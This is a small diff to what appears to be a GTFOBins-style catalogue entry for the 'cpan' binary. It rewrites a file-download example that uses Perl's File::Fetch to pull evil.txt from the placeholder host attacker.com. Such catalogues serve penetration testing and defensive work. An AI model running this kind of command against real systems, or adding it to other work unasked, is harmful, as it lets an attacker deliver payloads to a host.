@@ -23,10 +23,9 @@ functions:
   file-download:
     - description: Fetch a remote file via HTTP GET request and store it in PWD.
       code: |
-        export RHOST=attacker.com
-        export DFILE=evil.txt
+        export URL=http://attacker.com/evil.txt
         cpan
-        ! use File::Fetch; my $file = (File::Fetch->new(uri => "http://$ENV{RHOST}/$ENV{DFILE}"))->fetch();
+        ! use File::Fetch; my $file = (File::Fetch->new(uri => "$ENV{URL}"))->fetch();
 
   sudo:
     - code: |
